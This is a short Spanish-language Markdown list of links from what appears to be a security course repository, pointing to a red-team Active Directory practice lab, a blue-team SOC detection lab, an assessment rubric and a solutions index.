- [Laboratorio Red Team / Active Directory](../labs/red-team-ad/README.md) — entorno GOAD para practicar
  las clases 170–175.
- [Laboratorio Purple / Blue (SOC)](../labs/blue-team-soc/README.md) — para el lado de detección.
- [Rúbrica de evaluación](../docs/rubrica-evaluacion.md) · [Índice de soluciones](README.md)
